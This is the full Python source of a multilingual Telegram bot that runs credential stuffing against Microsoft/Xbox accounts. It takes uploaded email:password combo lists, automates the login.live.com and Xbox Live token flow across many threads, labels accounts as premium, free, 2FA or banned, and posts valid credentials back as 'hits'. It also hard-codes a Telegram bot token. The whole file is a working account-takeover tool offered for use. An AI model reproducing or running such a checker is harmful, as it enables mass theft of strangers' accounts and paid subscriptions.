import os
import re
import time
import threading
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import urllib3

urllib3.disable_warnings()

# التوكن الخاص بك
BOT_TOKEN = "8920692173:AAET9TgNCP8ArLi4TIR9zL3mH-KOfM7mKaU"

bot = telebot.TeleBot(BOT_TOKEN)
_TIMEOUT = (8, 10)

busy_users = set()
active_scans = {}
user_settings = {}

# قاموس الترجمات الشامل (لكل النصوص والأزرار)
TRANSLATIONS = {
    "ar": {
        "welcome": "# WELCOME TO {bot_name} #\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– 📬 أرسل ملف الكومبو الخاص بك (.txt)\n︙ التنسيق: mail:pass (سطر لكل حساب)\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– 📊 لوحة التحكم الخاصة بك:\n︙ الثريدز: {threads} / {max_threads}\n︙ الخطة: {plan}\n︙ الأيام المتبقية: –\n︙ الحد اليومي: 5268 / 5851 سطر\n︙ الوضع: 🎮 {mode}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– ◎ اختر خياراً من القائمة أدناه:",
        "settings_title": "⚙️ **إعدادات البوت**",
        "threads_title": "# 🧵 تعيين عدد الثريدز #\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nالحدود حسب خطتك:\n- مجاني (FREE): 1-50\n- أساسي (BASIC): 1-75\n- مميز (VIP): 1-125\n\nخطتك الحالية ({plan}) تتيح لك حتى {max_threads} ثريد.\nأرسل رقماً بين 1 و {max_threads}.",
        "stats": "📊 إحصائياتك: لا توجد عمليات فحص سابقة مسجلة.",
        "membership_msg": "💎 خطتك الحالية هي: {plan}",
        "changed_lang": "✅ تم تغيير اللغة إلى: العربية",
        
        # أزرار القائمة الرئيسية
        "btn_stats": "📊 الإحصائيات",
        "btn_referrals": "🔗 الإحالات",
        "btn_rewards": "🎁 المكافآت",
        "btn_membership": "💎 العضوية",
        "btn_support": "📞 الدعم",
        "btn_settings": "⚙️ الإعدادات",
        
        # أزرار الإعدادات
        "btn_change_lang": "🌐 تغيير اللغة (EN/TR/AR)",
        "btn_change_name": "🏷️ تغيير اسم البوت",
        "btn_api_mode": "📡 وضع الـ API",
        "btn_set_threads": "🧵 تعيين الثريدز",
        "btn_change_plan": "💎 تغيير الخطة",
        "btn_main_menu": "🔙 القائمة الرئيسية",
        "btn_back": "🔙 رجوع"
    },
    "en": {
        "welcome": "# WELCOME TO {bot_name} #\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– 📬 Send your combo list (.txt file)\n︙ Format: mail:pass (one per line)\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– 📊 Your Dashboard:\n︙ Threads: {threads} / {max_threads}\n︙ Plan: {plan}\n︙ Days Left: –\n︙ Daily Limit: 5268 / 5851 lines\n︙ Mode: 🎮 {mode}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– ◎ Select an option from the menu below:",
        "settings_title": "⚙️ **Bot Settings**",
        "threads_title": "# 🧵 Set Thread Count #\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nLimits by plan:\n- FREE: 1-50\n- BASIC: 1-75\n- VIP: 1-125\n\nYour plan ({plan}) allows up to {max_threads} threads.\nSend a number between 1 and {max_threads}.",
        "stats": "📊 Stats: No previous scans recorded.",
        "membership_msg": "💎 Your current plan is: {plan}",
        "changed_lang": "✅ Language changed to: English",
        
        # أزرار القائمة الرئيسية
        "btn_stats": "📊 Stats",
        "btn_referrals": "🔗 Referrals",
        "btn_rewards": "🎁 Rewards",
        "btn_membership": "💎 Membership",
        "btn_support": "📞 Support",
        "btn_settings": "⚙️ Settings",
        
        # أزرار الإعدادات
        "btn_change_lang": "🌐 Change Language (EN/TR/AR)",
        "btn_change_name": "🏷️ Change Bot Name",
        "btn_api_mode": "📡 API Mode",
        "btn_set_threads": "🧵 Set Threads",
        "btn_change_plan": "💎 Change Plan",
        "btn_main_menu": "🔙 Main Menu",
        "btn_back": "🔙 Back"
    },
    "tr": {
        "welcome": "# {bot_name} - HOŞ GELDİNİZ #\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– 📬 Combo listenizi gönderin (.txt dosyası)\n︙ Format: mail:pass (her satırda bir tane)\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– 📊 Kontrol Paneliniz:\n︙ İş Parçacığı (Threads): {threads} / {max_threads}\n︙ Plan: {plan}\n︙ Kalan Gün: –\n︙ Günlük Limit: 5268 / 5851 satır\n︙ Mod: 🎮 {mode}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– ◎ Aşağıdaki menüden bir seçenek belirleyin:",
        "settings_title": "⚙️ **Bot Ayarları**",
        "threads_title": "# 🧵 İş Parçacığı Sayısını Ayarla #\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nPlana göre sınırlar:\n- FREE: 1-50\n- BASIC: 1-75\n- VIP: 1-125\n\nMevcut planınız ({plan}) {max_threads} kadar izin verir.\n1 ile {max_threads} arasında bir sayı gönderin.",
        "stats": "📊 İstatistik: Kayıtlı tarama bulunamadı.",
        "membership_msg": "💎 Mevcut planınız: {plan}",
        "changed_lang": "✅ Dil Türkçe olarak değiştirildi",
        
        # أزرار القائمة الرئيسية
        "btn_stats": "📊 İstatistikler",
        "btn_referrals": "🔗 Referanslar",
        "btn_rewards": "🎁 Ödüller",
        "btn_membership": "💎 Üyelik",
        "btn_support": "📞 Destek",
        "btn_settings": "⚙️ Ayarlar",
        
        # أزرار الإعدادات
        "btn_change_lang": "🌐 Dil Değiştir (EN/TR/AR)",
        "btn_change_name": "🏷️ Bot Adını Değiştir",
        "btn_api_mode": "📡 API Modu",
        "btn_set_threads": "🧵 İş Parçacığı Ayarla",
        "btn_change_plan": "💎 Planı Değiştir",
        "btn_main_menu": "🔙 Ana Menü",
        "btn_back": "🔙 Geri"
    }
}

def get_user_config(chat_id):
    if chat_id not in user_settings:
        user_settings[chat_id] = {
            "bot_name": "Xbox Checker",
            "threads": 50,
            "max_threads": 50,
            "mode": "Xbox Check",
            "plan": "🆓 FREE",
            "lang": "ar",
            "link_mode": False,
            "channel_send": False,
            "keywords": 3
        }
    return user_settings[chat_id]


class XboxChecker:
    LOGIN_URL = (
        "https://login.live.com/oauth20_authorize.srf"
        "?client_id=00000000402B5328"
        "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
        "&scope=service::user.auth.xboxlive.com::MBI_SSL"
        "&display=touch&response_type=token&locale=en"
    )

    def _session(self):
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        return s

    def _extract_token(self, url):
        fragment = urlparse(url).fragment
        if not fragment and "#" in url:
            fragment = url.split("#", 1)[1]
        params = parse_qs(fragment)
        return params.get("access_token", [None])[0]

    def check(self, email, password):
        try:
            session = self._session()
            r1 = session.get(self.LOGIN_URL, timeout=_TIMEOUT)
            sftag_m = re.search(r'value=\\"(.+?)\\"', r1.text)
            url_post_m = re.search(r'"urlPost":"(.+?)"', r1.text)
            if not sftag_m or not url_post_m:
                return {"status": "ERROR"}
            sftag = sftag_m.group(1)
            url_post = url_post_m.group(1)

            r2 = session.post(
                url_post,
                data={"login": email, "loginfmt": email, "passwd": password, "PPFT": sftag},
                timeout=_TIMEOUT,
                allow_redirects=True,
            )

            ms_token = None
            if "access_token" in r2.url:
                ms_token = self._extract_token(r2.url)
            else:
                r2_lower = r2.text.lower()
                if any(x in r2_lower for x in ["incorrect account", "password is incorrect", "doesn't exist", "no account found"]) or re.search(r'sErrorCode.*?"50126"', r2.text):
                    return {"status": "BAD"}
                if "identity/confirm" in r2.url or "two-step verification" in r2_lower:
                    return {"status": "2FA"}
                if "/Abuse" in r2.url or "suspended" in r2_lower:
                    return {"status": "BANNED"}

                form_action_m = re.search(r'<form[^>]*action="([^"]+)"', r2.text)
                if form_action_m:
                    action = form_action_m.group(1)
                    hidden = {}
                    for m in re.finditer(r'<input[^>]+>', r2.text, re.I):
                        inp = m.group()
                        if "hidden" in inp.lower():
                            n = re.search(r'name="([^"]+)"', inp)
                            v = re.search(r'value="([^"]*)"', inp)
                            if n:
                                hidden[n.group(1)] = v.group(1) if v else ""
                    r3 = session.post(action, data=hidden, timeout=_TIMEOUT, allow_redirects=True)
                    if "access_token" in r3.url:
                        ms_token = self._extract_token(r3.url)

                if not ms_token:
                    return {"status": "BAD"}

            r_xbl = session.post(
                "https://user.auth.xboxlive.com/user/authenticate",
                json={
                    "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT",
                },
                timeout=_TIMEOUT,
            )
            if r_xbl.status_code != 200:
                return {"status": "FREE", "data": {}}
            
            xbl_data = r_xbl.json()
            xbl_token = xbl_data["Token"]
            uhs = xbl_data["DisplayClaims"]["xui"][0]["uhs"]

            r_xsts = session.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json={
                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
                    "RelyingParty": "http://xboxlive.com",
                    "TokenType": "JWT",
                },
                timeout=_TIMEOUT,
            )
            
            gamertag = ""
            gamerscore = 0
            if r_xsts.status_code == 200:
                xsts_token = r_xsts.json()["Token"]
                xbl_auth = f"XBL3.0 x={uhs};{xsts_token}"
                r_prof = session.get(
                    "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore",
                    headers={"Authorization": xbl_auth, "x-xbl-contract-version": "2"},
                    timeout=_TIMEOUT,
                )
                if r_prof.status_code == 200:
                    settings = r_prof.json().get("profileUsers", [{}])[0].get("settings", [])
                    for s in settings:
                        if s.get("id") == "Gamertag":
                            gamertag = s.get("value", "")
                        elif s.get("id") == "Gamerscore":
                            try:
                                gamerscore = int(s.get("value", 0))
                            except:
                                pass

            gamepass_type = None
            r_mc_xsts = session.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json={
                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
                    "RelyingParty": "rp://api.minecraftservices.com/",
                    "TokenType": "JWT",
                },
                timeout=_TIMEOUT,
            )
            if r_mc_xsts.status_code == 200:
                mc_xsts_token = r_mc_xsts.json()["Token"]
                r_mc_auth = session.post(
                    "https://api.minecraftservices.com/authentication/login_with_xbox",
                    json={"identityToken": f"XBL3.0 x={uhs};{mc_xsts_token}"},
                    timeout=_TIMEOUT,
                )
                if r_mc_auth.status_code == 200:
                    mc_token = r_mc_auth.json().get("access_token", "")
                    r_ent = session.get(
                        "https://api.minecraftservices.com/entitlements/mcstore",
                        headers={"Authorization": f"Bearer {mc_token}"},
                        timeout=_TIMEOUT,
                    )
                    if r_ent.status_code == 200:
                        ent_text = r_ent.text.lower()
                        if "product_game_pass_ultimate" in ent_text:
                            gamepass_type = "GAME PASS ULTIMATE"
                        elif "product_game_pass_pc" in ent_text:
                            gamepass_type = "PC GAME PASS"

            data = {"gamertag": gamertag, "gamerscore": gamerscore}
            if gamepass_type:
                data["gamepass"] = gamepass_type
                return {"status": "PREMIUM", "data": data}
            else:
                return {"status": "FREE", "data": data}

        except Exception:
            return {"status": "ERROR"}


commands = [
    telebot.types.BotCommand("start", "تشغيل البوت القائمة الرئيسية"),
    telebot.types.BotCommand("stop", "إيقاف الفحص الجاري"),
    telebot.types.BotCommand("queue", "معرفة حالة الفحص الحالي")
]
bot.set_my_commands(commands)


def send_main_menu(chat_id, message_id=None):
    config = get_user_config(chat_id)
    lang = config["lang"]
    t = TRANSLATIONS[lang]
    
    welcome_text = t["welcome"].format(
        bot_name=config["bot_name"],
        threads=config["threads"],
        max_threads=config["max_threads"],
        plan=config["plan"],
        mode=config["mode"]
    )
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(t["btn_stats"], callback_data="stats"),
        InlineKeyboardButton(t["btn_referrals"], callback_data="referrals"),
        InlineKeyboardButton(t["btn_rewards"], callback_data="rewards"),
        InlineKeyboardButton(t["btn_membership"], callback_data="membership"),
        InlineKeyboardButton(t["btn_support"], callback_data="support"),
        InlineKeyboardButton(t["btn_settings"], callback_data="settings")
    )
    
    if message_id:
        try:
            bot.edit_message_text(welcome_text, chat_id=chat_id, message_id=message_id, reply_markup=markup)
        except:
            bot.send_message(chat_id, welcome_text, reply_markup=markup)
    else:
        bot.send_message(chat_id, welcome_text, reply_markup=markup)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    send_main_menu(message.chat.id)


@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    config = get_user_config(chat_id)
    lang = config["lang"]
    t = TRANSLATIONS[lang]

    if call.data == "stats":
        bot.answer_callback_query(call.id, t["stats"])
    elif call.data == "referrals":
        bot.answer_callback_query(call.id, "🔗 Link system not active.")
    elif call.data == "rewards":
        bot.answer_callback_query(call.id, "🎁 No rewards available.")
    elif call.data == "membership":
        mem_text = t["membership_msg"].format(plan=config["plan"]) + "\n\nاختر الخطة الجديدة لتحديث صلاحياتك وعدد الثريدز:"
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("🆓 FREE (Max 50)", callback_data="plan_free"),
            InlineKeyboardButton("⭐ BASIC (Max 75)", callback_data="plan_basic"),
            InlineKeyboardButton("👑 VIP (Max 125)", callback_data="plan_vip"),
            InlineKeyboardButton(t["btn_back"], callback_data="settings")
        )
        bot.edit_message_text(mem_text, chat_id=chat_id, message_id=call.message.message_id, reply_markup=markup)
    
    elif call.data.startswith("plan_"):
        plan_type = call.data.replace("plan_", "")
        if plan_type == "free":
            config["plan"] = "🆓 FREE"
            config["max_threads"] = 50
        elif plan_type == "basic":
            config["plan"] = "⭐ BASIC"
            config["max_threads"] = 75
        elif plan_type == "vip":
            config["plan"] = "👑 VIP"
            config["max_threads"] = 125
        
        if config["threads"] > config["max_threads"]:
            config["threads"] = config["max_threads"]
            
        bot.answer_callback_query(call.id, f"✅ تم تحديث الخطة إلى: {config['plan']}")
        callback_handler(type('obj', (object,), {'data': 'membership', 'message': call.message, 'id': call.id}))

    elif call.data == "support":
        bot.answer_callback_query(call.id, "📞 Support channel.")
    
    elif call.data == "settings":
        link_status = "ON ✅" if config["link_mode"] else "OFF ❌"
        channel_status = "ON ✅" if config["channel_send"] else "OFF ❌"
        
        settings_text = (
            f"{t['settings_title']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🏷️ Bot Name: `{config['bot_name']}`\n"
            f"🌐 Language: `{lang.upper()}`\n"
            f"🧵 Threads: {config['threads']} / {config['max_threads']}\n"
            f"💎 Plan: {config['plan']}\n"
            f"🔗 Link Mode: {link_status}\n"
            f"📢 Channel Send: {channel_status}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(t["btn_change_lang"], callback_data="lang_menu"),
            InlineKeyboardButton(t["btn_change_name"], callback_data="change_name"),
            InlineKeyboardButton(t["btn_api_mode"], callback_data="api_mode"),
            InlineKeyboardButton(t["btn_set_threads"], callback_data="set_threads_menu"),
            InlineKeyboardButton(t["btn_change_plan"], callback_data="membership"),
            InlineKeyboardButton(t["btn_main_menu"], callback_data="main_menu")
        )
        bot.edit_message_text(settings_text, chat_id=chat_id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "lang_menu":
        lang_text = "🌐 **Select Language / اختر اللغة / Dil Seçin:**"
        markup = InlineKeyboardMarkup(row_width=3)
        markup.add(
            InlineKeyboardButton("🇦🇪 العربية", callback_data="set_lang_ar"),
            InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en"),
            InlineKeyboardButton("🇹🇷 Türkçe", callback_data="set_lang_tr"),
            InlineKeyboardButton(t["btn_back"], callback_data="settings")
        )
        bot.edit_message_text(lang_text, chat_id=chat_id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data.startswith("set_lang_"):
        selected_lang = call.data.replace("set_lang_", "")
        config["lang"] = selected_lang
        bot.answer_callback_query(call.id, TRANSLATIONS[selected_lang]["changed_lang"])
        
        # إعادة تحميل قائمة الإعدادات باللغة الجديدة فوراً
        new_t = TRANSLATIONS[selected_lang]
        link_status = "ON ✅" if config["link_mode"] else "OFF ❌"
        channel_status = "ON ✅" if config["channel_send"] else "OFF ❌"
        
        settings_text = (
            f"{new_t['settings_title']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🏷️ Bot Name: `{config['bot_name']}`\n"
            f"🌐 Language: `{selected_lang.upper()}`\n"
            f"🧵 Threads: {config['threads']} / {config['max_threads']}\n"
            f"💎 Plan: {config['plan']}\n"
            f"🔗 Link Mode: {link_status}\n"
            f"📢 Channel Send: {channel_status}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(new_t["btn_change_lang"], callback_data="lang_menu"),
            InlineKeyboardButton(new_t["btn_change_name"], callback_data="change_name"),
            InlineKeyboardButton(new_t["btn_api_mode"], callback_data="api_mode"),
            InlineKeyboardButton(new_t["btn_set_threads"], callback_data="set_threads_menu"),
            InlineKeyboardButton(new_t["btn_change_plan"], callback_data="membership"),
            InlineKeyboardButton(new_t["btn_main_menu"], callback_data="main_menu")
        )
        try:
            bot.edit_message_text(settings_text, chat_id=chat_id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")
        except:
            pass

    elif call.data == "change_name":
        bot.edit_message_text("🏷️ أرسل اسم البوت الجديد الآن عبر الرسائل:", chat_id=chat_id, message_id=call.message.message_id)
        bot.register_next_step_handler(call.message, process_name_input)

    elif call.data == "main_menu":
        send_main_menu(chat_id, call.message.message_id)

    elif call.data == "api_mode":
        api_text = (
            "# 📡 API Mode Selection #\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Current Mode: 🎮 {config['mode']}\n\n"
            "Click on a mode below to switch:"
        )
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🎮 Xbox Mode", callback_data="set_mode_xbox"),
            InlineKeyboardButton("🕹️ Roblox Mode", callback_data="set_mode_roblox"),
            InlineKeyboardButton("🎮 PSN Mode V2", callback_data="set_mode_psn"),
            InlineKeyboardButton("🟥 Netflix Mode", callback_data="set_mode_netflix"),
            InlineKeyboardButton(t["btn_back"], callback_data="settings")
        )
        bot.edit_message_text(api_text, chat_id=chat_id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data.startswith("set_mode_"):
        mode_name = call.data.replace("set_mode_", "").replace("_", " ").title()
        config["mode"] = mode_name
        bot.answer_callback_query(call.id, f"✅ Mode changed to: {mode_name}")
        callback_handler(type('obj', (object,), {'data': 'api_mode', 'message': call.message, 'id': call.id}))

    elif call.data == "set_threads_menu":
        threads_text = t["threads_title"].format(plan=config["plan"], max_threads=config["max_threads"])
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t["btn_back"], callback_data="settings"))
        bot.edit_message_text(threads_text, chat_id=chat_id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")
        bot.register_next_step_handler(call.message, process_thread_input)


def process_name_input(message):
    chat_id = message.chat.id
    config = get_user_config(chat_id)
    new_name = message.text.strip()
    if new_name:
        config["bot_name"] = new_name
        bot.reply_to(message, f"✅ تم تحديث اسم البوت إلى: `{new_name}`", parse_mode="Markdown")
        send_main_menu(chat_id)


def process_thread_input(message):
    chat_id = message.chat.id
    config = get_user_config(chat_id)
    max_t = config["max_threads"]
    try:
        val = int(message.text.strip())
        if 1 <= val <= max_t:
            config["threads"] = val
            bot.reply_to(message, f"✅ تم تحديث عدد الثريدز بنجاح إلى: `{val}`", parse_mode="Markdown")
            send_main_menu(chat_id)
        else:
            bot.reply_to(message, f"⚠️ يجب إدخال رقم بين 1 و {max_t} حسب خطتك الحالية.")
    except ValueError:
        bot.reply_to(message, "⚠️ يرجى إرسال رقم صحيح فقط.")


@bot.message_handler(commands=['stop'])
def stop_checker(message):
    chat_id = message.chat.id
    if chat_id in busy_users and chat_id in active_scans:
        active_scans[chat_id]["stop"] = True
        bot.reply_to(message, "🛑 جاري إيقاف الفحص...")
    else:
        bot.reply_to(message, "⚠️ لا توجد عملية فحص جارية حالياً.")


@bot.message_handler(commands=['queue'])
def check_queue(message):
    chat_id = message.chat.id
    if chat_id in busy_users and chat_id in active_scans:
        scan_info = active_scans[chat_id]
        bot.reply_to(message, f"📊 حالة الفحص: {scan_info['checked']} / {scan_info['total']}")
    else:
        bot.reply_to(message, "💤 البوت مسترخ ولا توجد ملفات قيد الفحص.")


@bot.message_handler(content_types=['document'])
def handle_file(message):
    chat_id = message.chat.id
    config = get_user_config(chat_id)
    
    if chat_id in busy_users:
        bot.reply_to(message, "⚠️ لديك ملف قيد الفحص بالفعل.")
        return

    try:
        file_name = message.document.file_name if message.document.file_name else "Combo.txt"
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        combos = []
        for line in downloaded_file.decode("utf-8", errors="ignore").splitlines():
            line = line.strip()
            if ":" in line:
                parts = line.split(":", 1)
                combos.append((parts[0].strip(), parts[1].strip()))

        if not combos:
            bot.reply_to(message, "الملف فارغ أو التنسيق غير صحيح.")
            return

        busy_users.add(chat_id)
        active_scans[chat_id] = {
            "checked": 0, "total": len(combos), "hits": 0,
            "free": 0, "two_fa": 0, "bad": 0, "error": 0, "stop": False
        }

        total = len(combos)
        max_workers = config["threads"]
        start_time = time.time()

        status_msg = bot.reply_to(message, f"⚡ تم تحميل {total} حساب. جاري بدء الفحص بنظام `{config['mode']}`...")

        checker = XboxChecker()
        lock = threading.Lock()

        def process_combo(email, password):
            if active_scans.get(chat_id, {}).get("stop", False):
                return
            result = checker.check(email, password)
            with lock:
                if active_scans.get(chat_id, {}).get("stop", False):
                    return
                active_scans[chat_id]["checked"] += 1
                checked = active_scans[chat_id]["checked"]
                status = result.get("status")

                if status == "PREMIUM":
                    active_scans[chat_id]["hits"] += 1
                    data = result.get("data", {})
                    hit_msg = f"🎮 **صيد مميز!**\n`{email}:{password}`\n💎 GamePass: `{data.get('gamepass', 'N/A')}`"
                    bot.send_message(chat_id, hit_msg, parse_mode="Markdown")
                elif status == "FREE":
                    active_scans[chat_id]["free"] += 1
                elif status == "2FA":
                    active_scans[chat_id]["two_fa"] += 1
                elif status == "BAD":
                    active_scans[chat_id]["bad"] += 1
                else:
                    active_scans[chat_id]["error"] += 1

                if checked % 50 == 0 or checked == total:
                    try:
                        bot.edit_message_text(
                            f"⚡ **جاري الفحص...**\n📊 `{checked} / {total}`",
                            chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown"
                        )
                    except:
                        pass

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(process_combo, p[0], p[1]) for p in combos]
            for f in as_completed(futures):
                if active_scans.get(chat_id, {}).get("stop", False):
                    break

        elapsed_time = max(int(time.time() - start_time), 1)
        scan_data = active_scans.get(chat_id, {})
        cpm = int((scan_data["checked"] / elapsed_time) * 60)

        report = (
            f"𖠵 📊 Scan Completed ✅ 𖥻\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ HITS: `{scan_data['hits']}`\n"
            f"🆓 FREE: `{scan_data['free']}`\n"
            f"🔐 2FA: `{scan_data['two_fa']}`\n"
            f"❌ BAD: `{scan_data['bad']}`\n"
            f"⚠️ ERROR: `{scan_data['error']}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ CPM: `{cpm}`"
        )
        bot.send_message(chat_id, report, parse_mode="Markdown")

    except Exception as e:
        bot.reply_to(message, f"حدث خطأ: {e}")
    finally:
        busy_users.discard(chat_id)
        active_scans.pop(chat_id, None)


if __name__ == "__main__":
    print("Bot is running with full features...")
    bot.infinity_polling()
